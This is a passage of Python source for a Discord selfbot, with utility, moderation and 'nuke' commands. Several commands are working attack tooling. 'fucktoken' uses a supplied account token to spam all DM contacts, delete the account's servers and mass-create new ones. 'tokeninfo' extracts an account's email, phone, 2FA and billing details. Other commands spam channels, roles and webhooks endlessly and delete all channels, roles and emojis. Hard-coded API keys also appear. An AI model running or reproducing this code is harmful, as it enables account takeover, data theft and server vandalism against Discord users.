    servers = ctx.bot.guilds
    servers_per_page = 10
    pages = math.ceil(len(servers) / servers_per_page)
    if page_number > pages:
        embed = discord.Embed(
            title="Error",
            description=f"Page no. is out of range. Please enter a no. between 1 and {pages}.",
            color=shadow_color )
        
        await send_embed(ctx, embed)
        return
    
    start = (page_number - 1) * servers_per_page
    end = start + servers_per_page
    server_list = '\n'.join([f'{server.name} ({server.id})' for server in servers[start:end]])
    
    embed = discord.Embed(
        description=f'Server List Will be sent in a txt after this msg',
        color=shadow_color )
    
    await send_embed(ctx, embed)
    full_server_list = '\n'.join([f'{server.name} ({server.id})' for server in servers])
    with open('server_list.txt', 'w', encoding='utf-8') as file:
        file.write(full_server_list)
    
    await ctx.send(file=discord.File('server_list.txt'))
    os.remove('server_list.txt')


@bot.command(name='firstmsg', aliases=['firstm'], brief="Shows first message of channel/dm", usage=".firstmsg")
async def firstmsg(ctx):
    message = None
    async for msg in ctx.channel.history(limit=1, oldest_first=True):
        message = msg
        break
    #bot_response = await ctx.send(message.jump_url)
    
    embed = discord.Embed(
        title="First Message",
        description=f"Jump to the first message: {message.jump_url}",
        color=shadow_color )
    
    await send_embed(ctx, embed)
    
    await asyncio.sleep(30)
    #await bot_response.delete()

@bot.command(name='screenshot', aliases=['ss'])
async def screenshot(ctx, url=None):
    if not url:
        embed = discord.Embed(
            title="Missing URL",
            description="Please provide a URL to take a screenshot.\nUsage: `!screenshot <url>`",
            color=shadow_color
        )
        await send_embed(ctx, embed)
        return

    kie = '66114d'
    endpoint = 'https://api.screenshotmachine.com'
    params = {
        'key': kie,
        'url': url,
        'dimension': '1024xfull',
        'format': 'png',
        'cacheLimit': '0',
        'timeout': '200'
    }
    try:
        response = requests.get(endpoint, params=params)
        response.raise_for_status()
        with open('idk.png', 'wb') as f:
            f.write(response.content)

        embed = discord.Embed(
            title="Screenshot",
            description=f"Here is the screenshot of {url}",
            color=shadow_color
        )
        
        await send_embed(ctx, embed)
        await ctx.send(file=discord.File('idk.png'), delete_after=30)
    except requests.exceptions.RequestException as e:
        embed = discord.Embed(
            title="Screenshot Error",
            description=f"Failed to take screenshot: {str(e)}",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    except Exception as e:
        embed = discord.Embed(
            title="Error",
            description=f"An error occurred: {str(e)}",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    finally:
        if os.path.exists('idk.png'):
            os.remove('idk.png')

@bot.command(aliases=['findphoto', 'showphoto'])
async def getpic(ctx, *, query):
    google_api_key = 'AIzaSyDVaNy89jV_K6KP-ks5pdqJR839g3iLbdo'
    search_engine_id = '47f928af66b3d4185'
    url = 'https://www.googleapis.com/customsearch/v1'
    params = {
        'key': google_api_key,
        'cx': search_engine_id,
        'q': query,
        'searchType': 'image',
        'num': 1}
    
    response = requests.get(url, params=params)
    if response.status_code == 200:
        data = response.json()
        if 'items' in data and len(data['items']) > 0:
            image_url = data['items'][0]['link']

            embed = discord.Embed(
                title="Image Search Result",
                description=f"Here is the image for your query: {query}",
                color=shadow_color )
            embed.set_image(url=image_url)

            await send_embed(ctx, embed)

            await ctx.send(image_url, delete_after=30)
        else:
            embed = discord.Embed(
                title="Image Search Result",
                description="Couldn't find any images.",
                color=shadow_color )
            
            await send_embed(ctx, embed)

    else:
        embed = discord.Embed(
            title="Error",
            description="Error occurred or rate-limited.",
            color=shadow_color )
        
        await send_embed(ctx, embed)

@bot.command()
async def colorinfo(ctx, hex_color: str):
    if hex_color.startswith('#'):
        hex_color = hex_color[1:]
    if len(hex_color) == 6:
        embed = discord.Embed(
            title="Color Info",
            description=f"Color #{hex_color} is valid!",
            color=int(hex_color, 16)
        )
        await send_embed(ctx, embed)
    else:
        embed = discord.Embed(
            title="Error",
            description="Invalid hex color format!",
            color=shadow_color )
        
        await send_embed(ctx, embed)

@bot.command()
async def idtoname(ctx, id: int):
    user = bot.get_user(id)
    embed = discord.Embed(
        title="User Info",
        description=user.name if user else "User not found.",
        color=shadow_color )
    
    await send_embed(ctx, embed)

@bot.command()
async def idinfo(ctx, id: int):
    user = bot.get_user(id)
    if user:
        response = f"**User Info for {user}**\n"
        response += f"**ID**: {user.id}\n"
        response += f"**Name**: {user.name}\n"
        response += f"**Discriminator**: {user.discriminator}\n"
        response += f"**Created At**: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
        member = ctx.guild.get_member(id)
        if member:
            response += f"**Joined Server**: {member.joined_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
            response += f"**Roles**: {', '.join([role.name for role in member.roles if role.name != '@everyone'])}\n"
        else:
            response += "**Joined Server**: Not a member of this server.\n"
        
        embed = discord.Embed(
            title="User Information",
            description=response,
            color=shadow_color )
        await send_embed(ctx, embed)
    else:
        embed = discord.Embed(
            title="Error",
            description="User not found.",
            color=shadow_color )
        await send_embed(ctx, embed)

@bot.command()
async def userinfo(ctx, user: discord.User = None):
    user = user or ctx.author
    response = f"**User Info for {user}**\n"
    response += f"**ID**: {user.id}\n"
    response += f"**Name**: {user.name}\n"
    response += f"**Created at**: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n"

    embed = discord.Embed(
        title="User Information",
        description=response,
        color=shadow_color )
    await send_embed(ctx, embed)

@bot.command()
async def serverinfo(ctx):
    response = f"**Server Info for {ctx.guild.name}**\n"
    response += f"**ID**: {ctx.guild.id}\n"
    response += f"**Preferred Locale**: {ctx.guild.preferred_locale}\n"
    response += f"**Member Count**: {ctx.guild.member_count}\n"

    embed = discord.Embed(
        title="Server Information",
        description=response,
        color=shadow_color )
    await send_embed(ctx, embed)

start_time = datetime.now(timezone.utc)

@bot.command()
async def uptime(ctx):
    now = datetime.now(timezone.utc)
    uptime_duration = now - start_time

    days, remainder = divmod(uptime_duration.total_seconds(), 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)

    embed = discord.Embed(
        title="🕒 Bot Uptime",
        description=f"**{int(days)}**d **{int(hours)}**h **{int(minutes)}**m **{int(seconds)}**s",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command(aliases=['av'])
async def avatar(ctx, user: discord.User = None, user_id: int = None):
    if user_id:
        user = await bot.fetch_user(user_id)
    user = user or ctx.author
    embed = discord.Embed(
        title="User Avatar",
        description=f"Here is {user.name}'s avatar.",
        color=shadow_color
    )
    embed.set_image(url=user.avatar.url)
    await send_embed(ctx, embed)

@bot.command(aliases=['downloadav'])
async def downloadavatar(ctx, user: discord.User = None, user_id: int = None):
    if user_id:
        user = await bot.fetch_user(user_id)
    user = user or ctx.author
    embed = discord.Embed(title="Avatar URL", description=f"[Click To Download]({user.avatar.url})", color=shadow_color)
    embed.set_image(url=user.avatar.url)
    await send_embed(ctx, embed)

@bot.command()
async def purge(ctx, amount: int):
    await ctx.channel.purge(limit=amount + 1)
    embed = discord.Embed(title="Purge", description=f"Deleted {amount} messages.", color=shadow_color)
    await send_embed(ctx, embed)

@bot.command()
async def purgeuser(ctx, user: discord.User, amount: int = 10):
    try:
        deleted = await ctx.channel.purge(limit=amount, check=lambda m: m.author == user)
        embed = discord.Embed(title="Purge User", description=f"Deleted {len(deleted)} messages from {user.mention}.", color=shadow_color)
    except discord.Forbidden:
        embed = discord.Embed(title="Error", description="I don't have permission to delete messages in this channel.", color=shadow_color)
    except discord.HTTPException as e:
        embed = discord.Embed(title="Error", description=f"Failed to delete messages: {str(e)}", color=shadow_color)
    await send_embed(ctx, embed)

@bot.command()
async def ip(ctx, ip_address: str):
    response = requests.get(f"https://ipinfo.io/{ip_address}/json")
    data = response.json()

    embed = discord.Embed(
        title="IP Information",
        description=f"Details for IP: `{ip_address}`",
        color=shadow_color
    )
    embed.add_field(name="City", value=data.get("city", "N/A"), inline=True)
    embed.add_field(name="Region", value=data.get("region", "N/A"), inline=True)
    embed.add_field(name="Country", value=data.get("country", "N/A"), inline=True)
    embed.add_field(name="Organization", value=data.get("org", "N/A"), inline=False)
    embed.add_field(name="Location", value=data.get("loc", "N/A"), inline=True)
    embed.add_field(name="Postal Code", value=data.get("postal", "N/A"), inline=True)
    embed.set_footer(text="Made by 75hq")
    await send_embed(ctx, embed)

@bot.command()
async def leave(ctx, guild_id: int):
    guild = bot.get_guild(guild_id)
    if guild:
        embed = discord.Embed(title="Leave Guild", description=f"Left the guild: {guild.name}.", color=shadow_color)
        await send_embed(ctx, embed)
        await guild.leave()
    else:
        embed = discord.Embed(title="Error", description="Guild not found or the bot is not a member of that guild.", color=shadow_color)
        await send_embed(ctx, embed)

@bot.command(aliases=['hypehousechange', 'hypehouse', "hypesquadchange", "changehypesquad", "changehypehouse", "househype"])
async def hypesquad(ctx, squad=None):
    if squad is None:
        options_message = (f"**- Hypesquad Changer**\n"
            f"Options:\n"
            f"`{bot.command_prefix}hypesquad bravery`\n"
            f"`{bot.command_prefix}hypesquad brilliance`\n"
            f"`{bot.command_prefix}hypesquad balance`")
        embed = discord.Embed(title="Hypesquad Changer", description=options_message, color=shadow_color)
        await send_embed(ctx, embed)
        return
    if squad.lower() in ["bravery", "1"]:
        typeofhouse = 1
    elif squad.lower() in ["brilliance", "2"]:
        typeofhouse = 2
    elif squad.lower() in ["balance", "3"]:
        typeofhouse = 3
    else:
        allhouses = [1, 2, 3]
        typeofhouse = random.choice(allhouses)
    headers = {
        'Authorization': token.strip(),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'Accept': '*/*'
    }
    response = requests.post("https://discord.com/api/v6/hypesquad/online", json={'house_id': typeofhouse}, headers=headers)
    if response.status_code == 204:
        success_message = (
            f"**- Hypesquad Changer**\n"
            f"Hypesquad changed successfully!")
        embed = discord.Embed(title="Hypesquad Change", description=success_message, color=shadow_color)
        await send_embed(ctx, embed)
    else:
        error_message = (
            f"**- Hypesquad Changer**\n"
            f"Error - Site responded with status code: `{response.status_code}`\n"
            f"Message: `{response.text}`")
        embed = discord.Embed(title="Hypesquad Error", description=error_message, color=shadow_color)
        await send_embed(ctx, embed)

@bot.command(aliases=['cleardms', 'dmsclear'])
async def dmclear(ctx):
    users_done = 0
    total_messages = 0
    initial_message = (
        "# Message Clearer\n"
        "Clearing all messages with all users"
    )
    msg = await ctx.send(initial_message)
    for channel in bot.private_channels:
        if isinstance(channel, discord.DMChannel):
            async for message in channel.history(limit=9999):
                try:
                    if message.author == bot.user:
                        if message != msg:
                            await message.delete()
                            total_messages += 1
                except Exception as e:
                    print(f"Error deleting message: {e}")
            users_done += 1
            update_message = (
                f"# Message Clearer\n"
                f"Clearing all messages with all users\n"
                f"Users Done: {users_done}\n"
                f"Total Messages Deleted: {total_messages}"
            )
            await msg.edit(content=update_message)
    final_message = (
        f"# Message Clearer\n"
        f"Clearing all messages with all users\n"
        f"Task completed - Cleared messages with {users_done} Users\n"
        f"Total Messages Deleted: {total_messages}"
    )
    await msg.edit(content=final_message, delete_after=15)

@bot.command(name='deletemessagesafter')
async def toggle_delete(ctx, option: str):
    global delete_bot_messages
    if option.lower() == 'on':
        delete_bot_messages = True
        embed = discord.Embed(title="Bot Message Deletion", description="Bot message deletion is now **enabled**.", color=shadow_color)
        await send_embed(ctx, embed)
    elif option.lower() == 'off':
        delete_bot_messages = False
        embed = discord.Embed(title="Bot Message Deletion", description="Bot message deletion is now **disabled**.", color=shadow_color)
        await send_embed(ctx, embed)
    else:
        embed = discord.Embed(title="Error", description="Please use `on` or `off` to toggle the deletion feature.", color=shadow_color)
        await send_embed(ctx, embed)

@bot.command(aliases=['reactspam', 'massreact'])
async def spamreact(ctx, message_id: int, count: int = 1):
    reactions = ["😔", "😳", "😂", "🤣", "😊", "😼", "😈", "🎉", "💔", "🍰", "😍"]
    try:
        message = await ctx.channel.fetch_message(message_id)
        for _ in range(count):
            for reaction in reactions:
                try:
                    await message.add_reaction(reaction)
                except discord.Forbidden:
                    print(f"Cannot add reaction to message {message.id}: Missing permissions.")
                except discord.HTTPException as e:
                    print(f"Failed to add reaction to message {message.id}: {e}")
        embed = discord.Embed(title="Mass Reaction", description=f"Reacted to message {message_id} with {count} reactions.", color=shadow_color)
        await send_embed(ctx, embed)
    except discord.NotFound:
        embed = discord.Embed(title="Error", description=f"**Error:** Message with ID {message_id} not found.", color=shadow_color)
        await send_embed(ctx, embed)
    except Exception as e:
        embed = discord.Embed(title="Error", description=f"**Error:** {str(e)}", color=shadow_color)
        await send_embed(ctx, embed)

@bot.command(name='watch')
async def watch(ctx, *, status: str):
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=status))
    embed = discord.Embed(title="Status Change", description=f"Changed status to **watching**: {status}", color=shadow_color)
    await send_embed(ctx, embed)

@bot.command(name='listen')
async def listen(ctx, *, status: str):
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=status))
    embed = discord.Embed(title="Status Change", description=f"Changed status to **listening**: {status}", color=shadow_color)
    await send_embed(ctx, embed)

@bot.command(name='game')
async def game(ctx, *, status: str):
    await bot.change_presence(activity=discord.Game(name=status))
    embed = discord.Embed(title="Status Change", description=f"Changed status to **playing**: {status}", color=shadow_color)
    await send_embed(ctx, embed)

@bot.command(aliases=['streamurl'])
async def twitchurl(ctx, streamurltouse: str):
    global streamurl
    streamurl = streamurltouse
    embed = discord.Embed(title="Stream URL Changed", description=f"Stream URL is now: `{streamurl}`\nTry `{ctx.prefix}stream` or `{ctx.prefix}streamcycle`", color=shadow_color)
    await send_embed(ctx, embed)

@bot.command(name='stream')
async def stream(ctx, status: str):
    global streamurl
    if streamurl:
        await bot.change_presence(activity=discord.Streaming(name=status, url=streamurl))
        embed = discord.Embed(title="Streaming Status", description=f"Changed status to **streaming**: {status} (URL: {streamurl})", color=shadow_color)
        await send_embed(ctx, embed)
    else:
        embed = discord.Embed(title="Error", description=f"Please set a Twitch URL first using `{bot.command_prefix}twitchurl [url]`.", color=shadow_color)
        await send_embed(ctx, embed)

@bot.command()
async def setstatus(ctx, emoji: str, *, status_msg: str):
    emoji_id = None
    emoji_name = None
    if emoji.startswith('<:') and emoji.endswith('>'):
        emoji_name, emoji_id = emoji[2:-1].split(':')
        emoji_id = int(emoji_id)
    elif emoji.startswith('<a:') and emoji.endswith('>'):
        emoji_name, emoji_id = emoji[3:-1].split(':')
        emoji_id = int(emoji_id)
    payload = {"text": status_msg, "emoji_name": emoji_name if emoji_id else None, "emoji_id": emoji_id}
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"status": "idle", "custom_status": payload})
    if response.status_code == 200:
        embed = discord.Embed(title="Custom Status Update", description="Status updated successfully!", color=shadow_color)
        await send_embed(ctx, embed)
    else:
        embed = discord.Embed(title="Error", description=f"Failed to update status: {response.text}", color=shadow_color)
        await send_embed(ctx, embed)

############################################
#            Emoji Commands                #
############################################

@bot.command()
async def addemoji(ctx, emoji_url: str = None, *, emoji_name: str = None):
    if not emoji_url or not emoji_name:
        await ctx.send("Usage: `!addemoji <emoji_url> <emoji_name>`")
        return

    if not ctx.author.guild_permissions.manage_emojis:
        await ctx.send("You do not have permission to manage emojis.")
        return

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(emoji_url) as response:
                if response.status != 200:
                    await ctx.send("Failed to fetch the emoji image.")
                    return
                image_data = await response.read()

        emoji = await ctx.guild.create_custom_emoji(name=emoji_name, image=image_data)
        embed = discord.Embed(
            title="Emoji Added",
            description=f"Emoji `{emoji.name}` has been added successfully!",
            color=shadow_color
        )
        embed.set_thumbnail(url=emoji.url)
        await send_embed(ctx, embed)
    except discord.Forbidden:
        await ctx.send("I do not have permission to add emojis to this server.")
    except discord.HTTPException as e:
        await ctx.send(f"Failed to add emoji: {e}")

@bot.command()
async def bigemoji(ctx, emoji: str):
    if emoji.startswith('<:') and emoji.endswith('>'):
        emoji_name, emoji_id = emoji[2:-1].split(':')
        emoji_id = int(emoji_id)
        embed = discord.Embed(
            title="Big Emoji Created",
            description=f"Big emoji created: `{emoji_name}`!",
            color=shadow_color
        )
        embed.set_image(url=f"https://cdn.discordapp.com/emojis/{emoji_id}.png?v=1")
        await send_embed(ctx, embed)
    else:
        await ctx.send("Please provide a valid custom emoji.")

@bot.command()
async def downloadguildemojis(ctx, guild_id: int):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/emojis", headers=headers)

    if response.status_code == 200:
        emojis = response.json()
        emoji_links = []
        for emoji in emojis:
            emoji_url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.png?v=1"
            emoji_links.append(f"{emoji['name']}: {emoji_url}")
        file_name = f"guild_{guild_id}_emojis.txt"
        with open(file_name, "w", encoding="utf-8") as file:
            file.write("\n".join(emoji_links))
        await ctx.send(file=discord.File(file_name))
        os.remove(file_name)
    else:
        await ctx.send("Failed to download emojis.")

@bot.command()
async def stealguildemoji(ctx, guild_id: int):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/emojis", headers=headers)
    
    if response.status_code == 200:
        emojis = response.json()
        if emojis:
            embed = discord.Embed(
                title="Emojis Stolen",
                description="Stole emojis from the guild.",
                color=shadow_color
            )
            for emoji in emojis:
                emoji_name = emoji['name']
                image_url = f"https://cdn.discordapp.com/emojis/{emoji['id']}.png?v=1"
                async with aiohttp.ClientSession() as session:
                    async with session.get(image_url) as response:
                        if response.status == 200:
                            image_data = await response.read()
                            await ctx.guild.create_custom_emoji(name=emoji_name, image=image_data)
                            embed.add_field(name=emoji_name, value=f"Stolen emoji: {emoji_name}", inline=False)
            await send_embed(ctx, embed)
        else:
            await ctx.send("No emojis found in that guild.")
    else:
        await ctx.send("Failed to steal emojis.")

############################################
#              Mod Commands                #
############################################

@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: commands.MemberConverter, *, reason=None):
    await member.kick(reason=reason)
    embed = discord.Embed(
        title="User Kicked",
        description=f"Kicked {member.mention} for reason: {reason or 'No reason provided'}",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: commands.MemberConverter, *, reason=None):
    await member.ban(reason=reason)
    embed = discord.Embed(
        title="User Banned",
        description=f"Banned {member.mention} for reason: {reason or 'No reason provided'}",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
@commands.has_permissions(ban_members=True)
async def banid(ctx, user_id: int, *, reason=None):
    member = ctx.guild.get_member(user_id)
    if member:
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="User Banned by ID",
            description=f"Banned {member.mention} for reason: {reason or 'No reason provided'}",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    else:
        await ctx.send("User not found in the guild.")

@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, user_id: int):
    user = await bot.fetch_user(user_id)
    await ctx.guild.unban(user)
    embed = discord.Embed(
        title="User Unbanned",
        description=f"Unbanned {user.mention}.",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
@commands.has_permissions(manage_channels=True)
async def nuke(ctx):
    channel = ctx.channel
    await channel.clone()
    await channel.delete()
    embed = discord.Embed(
        title="Channel Nuked",
        description="This channel has been nuked!",
        color=shadow_color()
    )
    await send_embed(ctx, embed)

@bot.command(aliases=["purgebans", "unbanall"])
async def massunban(ctx):
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    embed = discord.Embed(
        title="Mass Unban",
        description="Attempting to unban all users...",
        color=shadow_color
    )
    await send_embed(ctx, embed)
    
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
            embed = discord.Embed(
                title="Unbanned",
                description=f"Unbanned {users.user.mention}.",
                color=shadow_color
            )
            await send_embed(ctx, embed)
        except Exception as e:
            print(f"Failed to unban {users.user}: {e}")

############################################
#               Nuke Commands              #
############################################

@bot.command()
@commands.has_permissions(kick_members=True)
async def prune(ctx, days: int):
    try:
        pruned_count = await ctx.guild.prune_members(days=days)
        embed = discord.Embed(
            title="Prune Completed",
            description=f"Pruned {pruned_count} members who were inactive for {days} days.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    except discord.Forbidden:
        embed = discord.Embed(
            title="Permission Error",
            description="I do not have permission to kick members.",
            color=shadow_color
        )
        await send_embed(ctx, embed)
    except discord.HTTPException as e:
        embed = discord.Embed(
            title="Prune Failed",
            description=f"Failed to prune members: {e}",
            color=shadow_color
        )
        await send_embed(ctx, embed)

@bot.command()
async def channelspam(ctx, name: str):
    while True:
        await ctx.guild.create_text_channel(f"{name}")

@bot.command()
async def deletechannels(ctx):
    channels = ctx.guild.text_channels
    for channel in channels:
        await channel.delete()

@bot.command()
async def rolespam(ctx, name: str):
    while True:
        await ctx.guild.create_role(name=f"{name}")

@bot.command()
async def deleteroles(ctx):
    guild = ctx.guild
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"Deleted role: {role.name}")
            except discord.Forbidden:
                print(f"Cannot delete role: {role.name}, missing permissions.")
            except discord.HTTPException as e:
                print(f"An error occurred while deleting {role.name}: {e}")
    embed = discord.Embed(
        title="Role Deletion",
        description="Deleted all custom roles.",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def emojinuke(ctx):
    emojis = ctx.guild.emojis
    for emoji in emojis:
        await emoji.delete()
    embed = discord.Embed(
        title="Emoji Nuked",
        description="Deleted all emojis in the guild.",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def webhookspam(ctx):
    guild = ctx.guild
    for channel in guild.text_channels:
        if isinstance(channel, discord.TextChannel):  
            try:
                webhook = await channel.create_webhook(name=f'{bot_name}')
                print(f'Created webhook in {channel.name}: {webhook.url}')
                await webhook.send(content=f'@everyone nuked by {bot_name}')
            except discord.Forbidden:
                print(f'No permission to create webhook in {channel.name}')
            except discord.HTTPException:
                print(f'Failed to create webhook in {channel.name}')

@bot.command()
async def stopwebhookspam(ctx):
    await ctx.send(f"{bot.command_prefix}restart", delete_after=1)

@bot.command(aliases=["infotoken"])
async def tokeninfo(ctx, bokenxd):
    data = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': bokenxd, 'Content-Type': 'application/json'})
    if data.status_code == 200:
        j = data.json()
        name = f'{j["username"]}#{j["discriminator"]}'
        userid = j['id']
        avatar = f"https://cdn.discordapp.com/avatars/{j['id']}/{j['avatar']}.webp"
        phone = j['phone']
        isverified = j['verified']
        email = j['email']
        twofa = j['mfa_enabled']
        flags = j['flags']
        creation_date = datetime.utcfromtimestamp(((int(userid) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        
        embed = discord.Embed(
            title="Token Information",
            description="Here is the information for the provided token:",
            color=shadow_color
        )
        embed.add_field(name="User", value=f"```{name}```", inline=False)
        embed.add_field(name="User ID", value=f"```{userid}```", inline=False)
        embed.add_field(name="Avatar URL", value=f"[Link]({avatar})", inline=False)
        embed.add_field(name="Phone Number Linked", value=f"```{phone or 'None'}```", inline=False)
        embed.add_field(name="Email Verification Status", value=f"```{isverified}```", inline=False)
        embed.add_field(name="Email Linked", value=f"```{email or 'None'}```", inline=False)
        embed.add_field(name="2FA Status", value=f"```{twofa}```", inline=False)
        embed.add_field(name="Flags", value=f"```{flags}```", inline=False)
        embed.add_field(name="Creation Date", value=f"```{creation_date}```", inline=False)
        await send_embed(ctx, embed)

        datahmm = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={'Authorization': bokenxd, 'Content-Type': 'application/json'})
        nitro_data = datahmm.json()
        if len(nitro_data) > 0:
            end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            totalnitro = abs((start - end).days)
            
            nitro_embed = discord.Embed(
                title="Nitro Information",
                description="Here is the Nitro subscription information:",
                color=shadow_color
            )
            nitro_embed.add_field(name="Nitro Start Date", value=f"```{start}```", inline=False)
            nitro_embed.add_field(name="Nitro End Date", value=f"```{end}```", inline=False)
            nitro_embed.add_field(name="Total Nitro Days", value=f"```{totalnitro}```", inline=False)
            await send_embed(ctx, nitro_embed)
    else:
        embed = discord.Embed(
            title="Error",
            description=f"Failed to fetch token information. Status Code: {data.status_code}",
            color=shadow_color
        )
        embed.add_field(name="Message", value=data.text, inline=False)
        await send_embed(ctx, embed)

async def send_friend_request(session, boken, user_id):
    async with session.put(f'https://discord.com/api/v10/users/@me/relationships/{user_id}', headers={
        "Content-Type": "application/json",
        'Authorization': boken,
    }, json={}) as req_response:
        if req_response.status == 204:  
            return f'Sent friend request to user ID: {user_id}'
        elif req_response.status == 403:
            return f'Error: CAPTCHA required when sending friend request to user ID: {user_id}'
        else:
            error_message = await req_response.text()
            return f'Failed to send friend request to user ID: {user_id}: {req_response.status} {error_message}'

@bot.command()
async def send_friends(ctx, boken: str):
    user_ids_file = 'friends_scrape.txt'  
    async with aiohttp.ClientSession() as session:
        with open(user_ids_file, 'r') as file:
            user_ids = [335812165292261378, 1166774799180251198, 773849193587539968, 435980435516817439]
        for user_id in user_ids:
            response = await send_friend_request(session, token, user_id)
            await ctx.send(response)

def makeguildxd(tokentouse, nukemsg):
    global serversmade
    data = {
    "name": nukemsg
    }
    headers={"authorization": tokentouse}
    servercreation = requests.post("https://discord.com/api/v8/guilds/templates/GC9sXUCX85P8",headers=headers,json=data).status_code
    if servercreation == 201:
        serversmade += 1

@bot.command(aliases=['tokenfuck', "tockenfuck", "fucktocken", "accountfuck", "fuckaccount"])
async def fucktoken(ctx, tokentofrick=None, *, nukemsg=f"{bot_name}"):
    global serversmade
    serversmade = 0
    
    if tokentofrick is None:
        await ctx.send(f"**Token Fuck**\nSupply a token - `{bot.command_prefix}tokenfuck [token-here] [message-to-nuke-with]`")
        return
    elif ctx.guild is None:
        await ctx.send("**Token Fuck**\nTry doing this command in a private server - it has problems in DMs!")
        return
    else:
        message = await ctx.send(f"**Token Fuck**\nIf you're sure you want to token fuck the account, react with the emoji below.\nThis process will DM all open DMs, then close them, leave all servers, and make a ton of servers.")
        await message.add_reaction('✅')
        reactionstuffyes = True
        def requirements(reaction, user):
            return user == ctx.author and str(reaction.emoji) == '✅' and message.id == message.id
        while reactionstuffyes:
            try:
                reaction, user = await bot.wait_for('reaction_remove', timeout=10, check=requirements)
                await message.edit(content=f"**Token Fuck**\nYou reacted, the process has started!\nValidating token...")
                await message.clear_reactions()
                reactionstuffyes = False
                headers = {"authorization": tokentofrick}
                tokendata = requests.get("https://discord.com/api/v8/users/@me", headers=headers)
                if tokendata.status_code != 200:
                    await message.edit(content=f"**Token Fuck**\nError - are you sure that token is correct?\nDiscord responded with: `{tokendata.text}`")
                else:
                    await message.edit(content=f"**Token Fuck**\nToken valid - continuing the process")
                    resp = requests.get("https://discord.com/api/v8/users/@me/channels", headers=headers)
                    data = json.loads(resp.text)
                    usersmessaged = 0
                    for channel in data:
                        messagesent = requests.post(f"https://discord.com/api/v8/channels/{channel['id']}/messages", headers=headers, json={"content": nukemsg})
                        if messagesent.status_code == 200:
                            usersmessaged += 1
                        else:
                            await asyncio.sleep(1)
                        requests.delete(f"https://discord.com/api/v8/channels/{channel['id']}", headers=headers)
                    await message.edit(content=f"**Token Fuck**\nMessaged {usersmessaged} people saying: `{nukemsg}` and cleared the conversation after")
                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
                    data = json.loads(resp.text)
                    serversleft = 0
                    for guild in data:
                        serverleaving = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{guild['id']}", headers=headers).status_code
                        if serverleaving == 204:
                            serversleft += 1
                        else:
                            await asyncio.sleep(1)
                    await message.edit(content=f"**Token Fuck**\nLeft `{serversleft}` servers")
                    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
                    data = json.loads(resp.text)
                    serversdeleted = 0
                    for guild in data:
                        servdel = requests.post(f"https://discord.com/api/v8/guilds/{guild['id']}/delete", headers=headers, json={}).status_code
                        if servdel == 204:
                            serversdeleted += 1
                        else:
                            await asyncio.sleep(1)
                    await message.edit(content=f"**Token Fuck**\nDeleted `{serversdeleted}` servers")
                    for _ in range(100):
                        threading.Thread(target=makeguildxd, args=(tokentofrick, nukemsg)).start()
                        await asyncio.sleep(1)
                    await message.edit(content=f"**Token Fuck**\nMade {serversmade} servers")
                    await asyncio.sleep(3)
                    await message.edit(content=f"**Overall results**:\nMessaged `{usersmessaged}` people with `{nukemsg}` and deleted the conversation.\nLeft `{serversleft}` servers\nDeleted `{serversdeleted}` servers\nMade `{serversmade}` servers")
            except asyncio.TimeoutError:
                await message.edit(content=f"**Token Fuck**\nYou took too long - run this command again if you wish to token fuck an account.")
                await message.clear_reactions()
                reactionstuffyes = False

############################################
#                Fun Commands              #
############################################

@bot.command()
async def name(ctx, *, name: str):
    embed = discord.Embed(
        title="Your Name",
        description=f"Your name is: {name}",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def nitro(ctx):
    embed = discord.Embed(
        title="Nitro Link",
        description="Here's a link to Nitro: [Nitro Link](https://discord.com/nitro)",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def impersonate(ctx, user: discord.User, *, message: str):
    embed = discord.Embed(
        title="Impersonation",
        description=f"{user.name} says: {message}",
        color=shadow_color
    )
    await send_embed(ctx, embed)

@bot.command()
async def www(ctx, user: discord.User):
    embed = discord.Embed(
        title="User Profile",
        description=f"Check out {user.mention}'s profile: [Profile Link](https://discord.com/users/{user.id})",
        color=shadow_color
    )
